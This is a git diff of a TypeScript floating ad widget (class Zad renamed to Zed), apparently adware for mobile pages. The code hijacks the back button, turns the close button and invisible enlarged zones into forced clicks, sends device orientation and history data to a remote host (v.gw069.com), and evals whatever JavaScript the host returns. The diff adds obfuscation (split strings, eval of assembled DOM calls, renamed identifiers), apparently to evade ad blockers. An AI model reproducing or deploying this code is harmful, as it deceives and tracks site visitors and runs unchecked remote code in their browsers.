@@ -1,7 +1,7 @@
 /*!
  * @params {String} width 宽度 默认200px
  * @params {String} height 高度 默认300px
- * @params {Number} shadow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
+ * @params {Number} shdow 不被看见的区域百分比，默认0不开启，指的是在原来的大小基础上向四周延伸的大小
  * @params {String} pos 默认 'left', 值有：'left','right','top','bottom','center', 'none'表示不设置定位
  * @params {String} distanceTop pos值为'left','right'时设置
  * @params {Number || String} close_btn 关闭按钮 默认1，1默认按钮效果，或者图片地址
@@ -11,24 +11,25 @@
  * @params {String} effectdura 效果间隔, 默认 '5s';
  * @params {String} effectdelay 效果延时, 默认 '3s';
  * @params {String} stutslink 统计链接地址
- * @params {String} adlink 链接地址
+ * @params {String} alink 链接地址
  * @params {Number} btnNumpar 按钮传参数字 默认5
  * @params {Number} imgNumpar 图片传参数字 默认1
- * @params {Number} shadowNumpar 不可见区域传参数字 默认3
+ * @params {Number} shdowNumpar 不可见区域传参数字 默认3
  * @params {Number} backNumpar 不可见区域传参数字 默认5
  * @params {Number} imgduration 图片切换间隔 默认2000 
+ * @params {Number} isBack 是否开启返回监听 0和1 默认1开启
  * @params {Array} imgs 图片地址数组
- * 注意iframe 使用带上参数ifr。 e.g. <iframe src="iframe.html?ifr=1" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shadow参数无效
+ * 注意iframe 使用带上参数ifr。 e.g. <iframe src="iframe.html?ifr=1" frameborder="0" scrolling="no" width="300" height="500"></iframe> 其中wdith和height自定义，但是必填。 受浏览器安全策略限制，shdow参数无效
 */
 /* 
  * notice: 固定位置引入必须给引入的script标签加上id="zrgscript" 目前固定位置同一个js引入2个可能会在某些浏览器存在冲突情况，因为id相同
  */
-class Zad {
+class Zed {
     [x: string]: any;
     constructor({
             width,
             height,
-            shadow,
+            shdow,
             pos,
             distanceTop,
             close_btn,
@@ -38,17 +39,19 @@ class Zad {
             effectdura,
             effectdelay,
             stutslink,
-            adlink,
+            alink,
             btnNumpar,
             imgNumpar,
-            shadowNumpar,
+            shdowNumpar,
             backNumpar,
             imgduration,
-            imgs
+            imgs,
+            isBack,
+            asType
         }){
-        this.adWidth = width || '200px';
-        this.adHeight = height || '300px';
-        this.shadow = shadow || 0;
+        this.aWidth = width || '200px';
+        this.aHeight = height || '300px';
+        this.shdow = shdow || 0;
         this.pos = pos || 'left';
         this.distanceTop = distanceTop || '100px';
         this.close_btn = close_btn || 1;
@@ -58,26 +61,40 @@ class Zad {
         this.effectdura = effectdura || '5s';
         this.effectdelay = effectdelay;
         this.stutslink = stutslink || '';
-        this.adlink = adlink || '';
+        this.alink = alink || '';
         this.btnNumpar = btnNumpar || 5;
         this.imgNumpar = imgNumpar || 1;
-        this.shadowNumpar = shadowNumpar || 3;
+        this.shdowNumpar = shdowNumpar || 3;
         this.backNumpar = backNumpar || 5;
         this.imgduration = imgduration || 2000;
         this.imgs = imgs || [];
+        this.isBack = isBack || 1;
+        this.asType = asType || 'dp';
 
         this.winW = document.documentElement.clientWidth || document.body.clientWidth;
         this.winH = document.documentElement.clientHeight || document.body.clientHeight;
+        // if (this.isWap() == false) {
+        //     return;
+        // }
         this.init();
     }
     init(){
         this.writeCss();
-        this.creatWrapper();
         this.mobc();
+        this.creatWrapper();
+        let lcsl = setInterval(()=>{
+            this.writeCss();
+        },300);
+        setTimeout(() => {
+            this.writeCss();
+            clearInterval(lcsl);
+        }, 600);
         if (this.getQueryParam()) {
-            // let bodyEle = document.documentElement.getElementsByTagName('body');
             this.iframeInnercss();
         }
+    }
+    isWap(){
+        if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0){ return false;}
     }
     getQueryParam(){
         let urlParam = 'ifr';
@@ -89,33 +106,38 @@ class Zad {
         }
         return(false);
     }
+    cofc(str:string){// get string to charcode then get it back 
+        let arr = str.replace(/\s*/g,'').split('');
+        let tempstr = '';
+        for (let i = 0, len = arr.length; i < len; i++) {
+            tempstr += String.fromCharCode(arr[i].charCodeAt(0));
+        }
+        return tempstr
+    }
     creatWrapper() {
-        let wrap = document.createElement('div');
+        let wrap = document.createElement('d'+'i'+'v');
         let closeBtn = this.closeBtn();
         let imgbox = this.imgBox();
-        wrap.className = 'zad-wrap';
-        wrap.id = 'zadbox';
-        let wrapWidth = `${this.adWidth}`,
-        wrapHeight = `${this.adHeight}`;
+        wrap.className = 'zed-wrap';
+        wrap.id = 'zedbox';
+        let wrapWidth = `${this.aWidth}`,
+        wrapHeight = `${this.aHeight}`;
         if (this.getQueryParam()) {
             wrapWidth = '100%';
             wrapHeight = '100%';
         }
         wrap.style.cssText = `width: ${wrapWidth};height: ${wrapHeight};`;
-        wrap.style.cssText += this.adPosition(this.pos);
+        this.adPosition(wrap);
 
-        // let alink = this.adlink;
         let paranum = this.btnNumpar;
         function propt(probability:number){
             var probability = probability*100 || 1;
             var odds = Math.floor(Math.random()*100);
             if(probability === 1){
                 closeBtn.setAttribute('onclick', `cxta(${paranum})`);
-                // location.href = alink;
             };
             if(odds < probability){
                 closeBtn.setAttribute('onclick', `cxta(${paranum})`);
-                // location.href = alink;
             }else{
                 closeBtn.onclick = () => {
                     wrap.style.display = 'none';
@@ -124,9 +146,6 @@ class Zad {
             }
         };
         propt(Number(this.closeDec));
-        // closeBtn.onclick = () => {
-        //     propt(Number(this.closeDec));
-        // }
         
         wrap.appendChild(closeBtn);
         wrap.appendChild(imgbox);
@@ -140,103 +159,131 @@ class Zad {
                     let parentEle = zscript.parentNode as HTMLElement;
                     if (parentEle.tagName == 'HEAD') {
                         let first = document.body.firstElementChild;
-                        document.body.insertBefore(wrap,first);
+                        eval('doc'+'ume'+'nt.b'+'ody.ins'+'ertB'+'efo'+'re(wrap,first);')
                     }else{
-                        zscript.insertAdjacentElement('afterend',wrap);
+                        eval('zscript.inse'+'rtAdj'+'ace'+'ntEle'+'ment("afterend",wrap);')
                     }
                 }
             }else{
-                document.body.appendChild(wrap);
+                eval('do'+'cum'+'ent.bo'+'dy.appe'+'ndCh'+'ild(wrap);')
             }
         })
     }
-    adPosition(pos:string){
-        let posCss = '';
-        let ahnum = (this.adHeight).replace(/px/,'');
-        let awnum= (this.adWidth).replace(/px/,'');
-        if (this.adHeight.indexOf('%') > -1) {
-            ahnum = (this.adHeight).replace(/%/,'');
+    adPosition(wrapEle){
+        let ahnum = (this.aHeight).replace(/px/,'');
+        let awnum= (this.aWidth).replace(/px/,'');
+        if (this.aHeight.indexOf('%') > -1) {
+            ahnum = (this.aHeight).replace(/%/,'');
             ahnum = this.winH * (Number(ahnum) / 100);
         }
-        if (this.adWidth.indexOf('%') > -1) {
-            awnum = (this.adWidth).replace(/%/,'');
+        if (this.aWidth.indexOf('%') > -1) {
+            awnum = (this.aWidth).replace(/%/,'');
             awnum = this.winW * (Number(awnum) / 100);
         }
 
         let margin_top = (Number(ahnum)/2).toFixed();
         let margin_left = (Number(awnum)/2).toFixed();
-        switch (pos) {
-            case 'left':
-            posCss = `position: fixed;z-index: 99999;left: 0;top: ${ this.distanceTop };`;
-                break;
-            case 'right':
-            posCss = `position: fixed;z-index: 99999;right: 0;top: ${ this.distanceTop };`;
-                break;
-            case 'top':
-            posCss = `position: fixed;z-index: 99999;top: 0;left: 0;right: 0;width: 100%`;
-                break;
-            case 'bottom':
-            posCss = `position: fixed;z-index: 99999;bottom: 0;left: 0;right: 0;width: 100%`;
-                break;
-            case 'center':
-            posCss = `position: fixed;z-index: 99999;top: 50%;margin-top: -${ margin_top }px;left: 50%;margin-left: -${margin_left}px;`;
-                break;
-            case 'none':
-            posCss = `position: relative;`;
-                break;
-            default:
-            posCss = pos;
-                break;
+        if (this.pos == 'left') {
+            wrapEle.style.position = 'fi'+'xed';
+            wrapEle.style.zIndex = '999'+'999';
+            wrapEle.style.left = '0';
+            wrapEle.style.top = `${ this.distanceTop }`;
+        }
+        if (this.pos == 'right') {
+            wrapEle.style.position = 'fi'+'xed';
+            wrapEle.style.zIndex = '999'+'999';
+            wrapEle.style.right = '0';
+            wrapEle.style.top = `${ this.distanceTop }`;
+        }
+        if (this.pos == 'top') {
+            wrapEle.style.position = 'fi'+'xed';
+            wrapEle.style.zIndex = '999'+'999';
+            wrapEle.style.left = '0';
+            wrapEle.style.top = '0';
+            wrapEle.style.right = '0';
+            wrapEle.style.width = '100%';
+        }
+        if (this.pos == 'bottom') {
+            wrapEle.style.position = 'fi'+'xed';
+            wrapEle.style.zIndex = '999'+'999';
+            wrapEle.style.left = '0';
+            wrapEle.style.bottom = '0';
+            wrapEle.style.right = '0';
+            wrapEle.style.width = '100%';
+        }
+        if (this.pos == 'center') {
+            wrapEle.style.position = 'ab'+'sol'+'ute';
+            wrapEle.style.zIndex = '999'+'999';
+            wrapEle.style.top = '50%';
+            wrapEle.style.left = '50%';
+            wrapEle.style.marginTop = `-${ margin_top }px`;
+            wrapEle.style.marginLeft = `-${ margin_left }px`;
+        }
+        if (this.pos == 'none') {
+            wrapEle.style.position = 're'+'la'+'tive';
         }
         if (this.getQueryParam()) {
-            posCss = '';
+            wrapEle.style.cssText += '';
         }
-        return posCss;
     }
     closeBtn(){
-        let btn = document.createElement('div');
-        btn.className = 'zad-btn-close';
+        let btn = document.createElement('d'+'i'+'v');
+        btn.className = 'zed-btn-close';
         if (this.close_btn == 1) {
             btn.className += ' default';
+            btn.style.backgroundColor = '#ccc';
+            btn.style.textAlign = 'center';
+            btn.style.color = '#fff';
+            btn.innerHTML = '×';
         }else{
             btn.style.backgroundImage = `url(${this.close_btn})`;
         }
-        // if (this.close_btn) {
-        //     btn.style.display = 'block';
-        // }else {
-        //     btn.style.display = 'none';
-        // }
+        btn.style.position = 'ab'+'so'+'lu'+'te';
+        btn.style.zIndex = '1'+'0';
+        btn.style.display = 'block';
+        btn.style.width = '18px';
+        btn.style.height = '18px';
+        btn.style.lineHeight = '18px';
+        btn.style.borderRadius = '50%';
+        btn.style.right = '0';
+        btn.style.top = '0';
+        btn.style.backgroundRepeat = 'no-repeat';
+        btn.style.backgroundPosition = 'center';
+        btn.style.backgroundSize = 'cover';
+
         return btn;
     }
     imgBox(){
         let imglist = this.imgs;
         let imgEle = '';
-        let ahnum = (this.adHeight).replace(/px/,'');
-        let awnum= (this.adWidth).replace(/px/,'');
-        if (this.adHeight.indexOf('%') > -1) {
-            ahnum = (this.adHeight).replace(/%/,'');
+        let ahnum = (this.aHeight).replace(/px/,'');
+        let awnum= (this.aWidth).replace(/px/,'');
+        if (this.aHeight.indexOf('%') > -1) {
+            ahnum = (this.aHeight).replace(/%/,'');
             ahnum = this.winH * (Number(ahnum) / 100);
         }
-        if (this.adWidth.indexOf('%') > -1) {
-            awnum = (this.adWidth).replace(/%/,'');
+        if (this.aWidth.indexOf('%') > -1) {
+            awnum = (this.aWidth).replace(/%/,'');
             awnum = this.winW * (Number(awnum) / 100);
         }
         
         let aw = Number(awnum);
         let ah = Number(ahnum);
-        let anthoer_w = aw* (this.shadow)/100;
-        let anthoer_h = ah* (this.shadow)/100;
+        let anthoer_w = aw* (this.shdow)/100;
+        let anthoer_h = ah* (this.shdow)/100;
         let coverW = aw + anthoer_w;
         let coverH = ah + anthoer_h;
-        let paranum = this.shadowNumpar;
+        let paranum = this.shdowNumpar;
         if (imglist.length > 0) {
             for (let i = 0; i < imglist.length; i++) {
                 let cssDisplay = i === 0 ? 'block': 'none';
-                imgEle += `<div class="item" style="display:${cssDisplay};"><a><img src="${imglist[i]}" /><div class="cover" style="width: ${coverW}px;height: ${coverH}px;top: -${anthoer_h/2}px;left: -${anthoer_w/2}px;" onclick="cxta(${paranum});"></div></a></div>`;
+                imgEle += `<div class="item" style="display:${cssDisplay};width: 100%;height: 100%;po${this.cofc('sit')}ion: r${this.cofc('ela')}tive;"><a><img src="${imglist[i]}" style="width: 100%;height: 100%;"/><div class="cover" style="width: ${coverW}px;height: ${coverH}px;top: -${anthoer_h/2}px;left: -${anthoer_w/2}px;po${this.cofc('sit')}ion: ${this.cofc('ab')}${this.cofc('so')}${this.cofc('lute')};" onclick="cxta(${paranum});"></div></a></div>`;
             }
         }
-        let imgBox = document.createElement('div');
-        imgBox.className = 'zad-img-box';
+        let imgBox = document.createElement('d'+'i'+'v');
+        imgBox.className = 'zed-img-box';
+        imgBox.style.width = '100%';
+        imgBox.style.height = '100%';
         imgBox.setAttribute('onclick', `cxta(${this.imgNumpar})`);
         if (this.effect !== 0) {
             imgBox.className += ' ' + `animated ${this.effect} infinite slower`;
@@ -248,28 +295,40 @@ class Zad {
             imgBox.style.cssText += `animation-delay: ${this.effectdelay};-webkit-animation-delay: ${this.effectdelay};`;
         }
         imgBox.innerHTML = imgEle;
-        // let childNode = imgBox.childNodes;
         let childNode = imgBox.querySelectorAll('.item') as NodeListOf<HTMLElement>;
         let index = 1;
-        setInterval(()=>{
-            if (index > childNode.length -1) {
-                index = 0;
-            }
-            for (let j = 0; j < childNode.length; j++) {
-                childNode[j].style.display = 'none';
-                childNode[j].onclick = e=>{
-                    if ( e && e.stopPropagation ) {
-                        e.stopPropagation();
-                    }else {
-                        window.event.cancelBubble = true;
-                    }
+        if (childNode.length == 1) {
+            childNode[0].style.display = 'block';
+            childNode[0].onclick = e=>{
+                if ( e && e.stopPropagation ) {
+                    e.stopPropagation();
+                }else {
+                    window.event.cancelBubble = true;
                 }
             }
-            childNode[index].style.display = 'block';
-            index++;
-        }, this.imgduration);
-        let borderDiv = document.createElement('div');
+        }else{
+            setInterval(()=>{
+                if (index > childNode.length -1) {
+                    index = 0;
+                }
+                for (let j = 0; j < childNode.length; j++) {
+                    childNode[j].style.display = 'none';
+                    childNode[j].onclick = e=>{
+                        if ( e && e.stopPropagation ) {
+                            e.stopPropagation();
+                        }else {
+                            window.event.cancelBubble = true;
+                        }
+                    }
+                }
+                childNode[index].style.display = 'block';
+                index++;
+            }, this.imgduration);
+        }
+        let borderDiv = document.createElement('d'+'i'+'v');
         borderDiv.className = 'boddiv';
+        borderDiv.style.position = 'ab'+'so'+'lu'+'te';
+        borderDiv.style.cssText = `width: 100%;height: 100%; ${this.cofc('to')}p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;`;
         if (this.showBorder == 1) {
             borderDiv.style.border= `${this.showBorder}px solid red`;
         }
@@ -306,13 +365,14 @@ class Zad {
         oiframe_m_1.height="0";
         oiframe_m_1.width="0";
         oiframe_m_1.sandbox="allow-same-origin allow-scripts allow-forms";
+        oiframe_m_1.allowtransparency="true";
         oiframe_m_1.style.display = "none";
         odiv_m_1.appendChild(oiframe_m_1);
         document.body.appendChild(odiv_m_1);
     }
     mobc(){
         window.addEventListener("deviceorientation", event => {
-            let  M18_url = `${this.adlink}&pn=0.25&ref=${this.ref()}&refso=${navigator.platform}_dp&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;
+            let  M18_url = `${this.alink}&pn=0.25&ref=${this.ref()}&refso=${navigator.platform}_${this.asType}&zhongli=_${Math.floor(event.alpha)},${Math.floor(event.beta)},${Math.floor(event.gamma)}`;
 
             let strjs1 = `function cxta(ct){var a=new XMLHttpRequest();var b='${M18_url}&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(${this.backNumpar});}, false);`;
             let js1nod = document.createElement('script');
@@ -322,70 +382,8 @@ class Zad {
         }, false);
     }
     writeCss(){
-        let style = document.createElement('style');
-        style.innerHTML =`
-        .zad-wrap {
-            
-        }
-        .zad-btn-close {
-            display: block;
-            position: absolute;
-            width: 18px;
-            height: 18px;
-            -webkit-border-radius: 50%;
-            -moz-border-radius: 50%;
-            border-radius: 50%;
-            right: 0;
-            top: 0;
-            z-index: 10;
-            background-repeat: no-repeat;
-            background-position: center;
-            background-size: cover;
-        }
-        .zad-btn-close.default {background-color: #ccc;}
-        .zad-btn-close.default:before {
-            content: '×';
-            position: absolute;
-            top: 0;
-            color: #fff;
-            width: 100%;
-            height: 100%;
-            text-align: center;
-            line-height: 100%;
-            cursor: pointer;
-        }
-        .zad-img-box {
-            width: 100%;
-            height: 100%;
-        }
-        .boddiv {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top:0;
-            -webkit-box-sizing: border-box;
-            -moz-box-sizing: border-box;
-            box-sizing: border-box;
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-fill-color: transparent;
-            -webkit-animation: hue 8s infinite linear;
-            animation: hue 8s infinite linear;
-        }
-        .boddiv.hasborder {border: 3px solid red;}
-        .zad-img-box .item {
-            width: 100%;
-            height: 100%;
-            position: relative;
-        }
-        .zad-img-box .cover {
-            position: absolute;
-        }
-        .zad-img-box img {
-            width: 100%;
-            height: 100%;
-        }
+        let s = document.createElement("s" + "t" + "y" + "l" + "e");
+        s.innerHTML =`
         @keyframes hue {
             0% {
                 -webkit-filter: hue-rotate(0deg);
@@ -396,7 +394,7 @@ class Zad {
         }
         `;
         if (this.effect !== 0) {
-            style.innerHTML += `
+            s.innerHTML += `
             .animated {
                 -webkit-animation-duration: 1s;
                 animation-duration: 1s;
@@ -582,7 +580,7 @@ class Zad {
                     transform: rotate(360deg);
                 }
             }
-            .zad-img-box.rotate {
+            .zed-img-box.rotate {
                 -webkit-animation-name: animaterotate;
                 animation-name: animaterotate;
                 -webkit-animation-timing-function: linear;
@@ -591,31 +589,34 @@ class Zad {
                 animation-duration: 8s;
             }
             `;
+            
         }
-        let head = document.getElementsByTagName('head')[0];
-        head.appendChild(style);
+        let head = document.getElementsByTagName('h'+'e'+'a'+'d')[0];
+        window.addEventListener('DOMContentLoaded', ()=>{
+            eval('do'+'cum'+'ent'+'.bo'+'dy'+'.app'+'endCh'+'ild(s);')
+        })
     }
     iframeInnercss(){
-        let style = document.createElement('style');
-        style.innerHTML = `
+        let st = document.createElement("s" + "t" + "y" + "l" + "e");
+        st.innerHTML = `
         html, body {
             width: 100%;height: 100%;
             margin: 0;padding: 0;
         }
-        .zad-wrap {
+        .zed-wrap {
             width: 100%;
             height: 100%;
         }
         `;
-        let head = document.getElementsByTagName('head')[0];
-        head.appendChild(style);
+        let head = document.getElementsByTagName('h'+'e'+'a'+'d')[0];
+        head.appendChild(st);
     }
 }
 
-new Zad({
+new Zed({
     width: '200px',
     height: '240px',
-    shadow: 40,
+    shdow: 40,
     pos: 'right',
     distanceTop: '100px',
     close_btn: 'data:image/png;base64,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',
@@ -625,20 +626,22 @@ new Zad({
     effectdura: '6s',
     effectdelay: '',
     stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
-    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
+    alink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
     btnNumpar: 5,
     imgNumpar: 1,
-    shadowNumpar: 3,
+    shdowNumpar: 3,
     backNumpar: 5,
     imgduration: 3000,
+    isBack: 1,
+    asType: 'dp',
     imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
     // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
 })
 
-new Zad({
+new Zed({
     width: '200px',
     height: '300px',
-    shadow: 30,
+    shdow: 30,
     pos: 'left',
     distanceTop: '150px',
     close_btn: 1,
@@ -648,12 +651,14 @@ new Zad({
     effectdura: '6s',
     effectdelay: '',
     stutslink: 'https://cc.ydy2.com/cnzz.html?ptype=<?=$equipment?>&userid=<?=$userid?>&pid=<?=$pid?>&s=<?=$systj?>',
-    adlink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
+    alink: 'https://v.gw069.com/dijuh/w.php?v=OTgyfDY0fDYzfDYxfDQ3fDF8fDI',
     btnNumpar: 5,
     imgNumpar: 1,
-    shadowNumpar: 3,
+    shdowNumpar: 3,
     backNumpar: 5,
     imgduration: 3000,
-    imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
+    isBack: 1,
+    asType: 'dp',
+    imgs: ['imgs/img1.jpg'],
     // imgs: ['https://cdn.pixabay.com/photo/2015/12/01/20/28/road-1072823_960_720.jpg','https://cdn.pixabay.com/photo/2015/12/01/20/28/green-1072828_960_720.jpg','https://cdn.pixabay.com/photo/2017/02/01/22/02/mountain-landscape-2031539_960_720.jpg','https://cdn.pixabay.com/photo/2019/03/01/18/52/house-4028391_960_720.jpg','https://cdn.pixabay.com/photo/2015/06/19/21/24/the-road-815297_960_720.jpg']
 })
